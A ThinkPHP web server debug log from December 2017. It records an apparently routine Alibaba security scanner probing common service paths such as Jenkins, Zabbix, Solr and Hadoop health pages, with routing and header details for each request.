[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T21:54:07+08:00 ] 172.17.195.153 106.11.224.159 GET /hwi/
[ log ] 39.106.4.226:80/hwi/ [运行时间：0.012610s][吞吐率：79.30req/s] [内存消耗：1,508.93kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'hwi',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T22:02:35+08:00 ] 172.17.195.153 106.11.224.207 GET /
[ log ] 39.106.4.226:80/ [运行时间：0.024543s][吞吐率：40.74req/s] [内存消耗：2,782.24kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T22:07:11+08:00 ] 172.17.195.153 106.11.224.141 GET /master-status
[ log ] 39.106.4.226:80/master-status [运行时间：0.011733s][吞吐率：85.23req/s] [内存消耗：1,509.02kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'master-status',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T22:08:20+08:00 ] 172.17.195.153 106.11.224.52 GET /dfshealth.html
[ log ] 39.106.4.226:80/dfshealth.html [运行时间：0.011725s][吞吐率：85.29req/s] [内存消耗：1,508.91kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'dfshealth',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T22:10:28+08:00 ] 172.17.195.153 106.11.224.136 GET /http://39.106.4.226:8080
[ log ] 39.106.4.226:80/http://39.106.4.226:8080 [运行时间：0.011069s][吞吐率：90.34req/s] [内存消耗：1,508.97kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'http:',
    1 => '39.106.4.226:8080',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T22:11:04+08:00 ] 172.17.195.153 106.11.224.185 GET /http://39.106.4.226:8081
[ log ] 39.106.4.226:80/http://39.106.4.226:8081 [运行时间：0.010896s][吞吐率：91.78req/s] [内存消耗：1,508.97kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'http:',
    1 => '39.106.4.226:8081',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T22:11:27+08:00 ] 172.17.195.153 106.11.224.19 GET /http://39.106.4.226:8090
[ log ] 39.106.4.226:80/http://39.106.4.226:8090 [运行时间：0.011628s][吞吐率：86.00req/s] [内存消耗：1,508.97kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'http:',
    1 => '39.106.4.226:8090',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T22:12:37+08:00 ] 172.17.195.153 106.11.224.200 GET /clusters.jsf
[ log ] 39.106.4.226:80/clusters.jsf [运行时间：0.010859s][吞吐率：92.09req/s] [内存消耗：1,509.00kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'clusters.jsf',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T22:12:59+08:00 ] 172.17.195.153 106.11.224.197 GET /about/
[ log ] 39.106.4.226:80/about/ [运行时间：0.011721s][吞吐率：85.32req/s] [内存消耗：1,508.89kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'about',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T22:13:04+08:00 ] 172.17.195.153 106.11.224.218 GET /
[ log ] 39.106.4.226:80/ [运行时间：0.026582s][吞吐率：37.62req/s] [内存消耗：2,782.24kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T22:13:08+08:00 ] 172.17.195.153 106.11.224.154 GET /jenkins/
[ log ] 39.106.4.226:80/jenkins/ [运行时间：0.010930s][吞吐率：91.49req/s] [内存消耗：1,508.97kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'jenkins',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T22:13:14+08:00 ] 172.17.195.153 106.11.224.101 GET /zabbix/
[ log ] 39.106.4.226:80/zabbix/ [运行时间：0.011627s][吞吐率：86.01req/s] [内存消耗：1,508.93kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'zabbix',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T22:13:14+08:00 ] 172.17.195.153 106.11.224.92 GET /
[ log ] 39.106.4.226:80/ [运行时间：0.024076s][吞吐率：41.54req/s] [内存消耗：2,782.24kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T22:13:16+08:00 ] 172.17.195.153 106.11.224.110 GET /solr/
[ log ] 39.106.4.226:80/solr/ [运行时间：0.011518s][吞吐率：86.82req/s] [内存消耗：1,508.91kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'solr',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T22:13:16+08:00 ] 172.17.195.153 106.11.224.110 GET /
[ log ] 39.106.4.226:80/ [运行时间：0.024569s][吞吐率：40.70req/s] [内存消耗：2,782.24kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T22:13:20+08:00 ] 172.17.195.153 106.11.224.40 GET /info
[ log ] 39.106.4.226:80/info [运行时间：0.011696s][吞吐率：85.50req/s] [内存消耗：1,508.93kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'info',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T22:13:34+08:00 ] 172.17.195.153 106.11.224.155 GET /warning
[ log ] 39.106.4.226:80/warning [运行时间：0.012060s][吞吐率：82.92req/s] [内存消耗：1,508.93kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'warning',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T22:13:38+08:00 ] 172.17.195.153 106.11.224.156 GET /pleasereadthis
[ log ] 39.106.4.226:80/pleasereadthis [运行时间：0.011671s][吞吐率：85.68req/s] [内存消耗：1,509.01kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'pleasereadthis',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T22:13:43+08:00 ] 172.17.195.153 106.11.224.116 GET /please_read/_search
[ log ] 39.106.4.226:80/please_read/_search [运行时间：0.011089s][吞吐率：90.18req/s] [内存消耗：1,509.33kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'please_read',
    1 => '_search',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T22:13:46+08:00 ] 172.17.195.153 106.11.224.219 GET /dfshealth.jsp
[ log ] 39.106.4.226:80/dfshealth.jsp [运行时间：0.011570s][吞吐率：86.43req/s] [内存消耗：1,509.02kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'dfshealth.jsp',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-29T22:13:46+08:00 ] 172.17.195.153 106.11.224.219 GET /hadoop/dfshealth.jsp
[ log ] 39.106.4.226:80/hadoop/dfshealth.jsp [运行时间：0.011617s][吞吐率：86.08req/s] [内存消耗：1,509.22kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'hadoop',
    1 => 'dfshealth.jsp',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
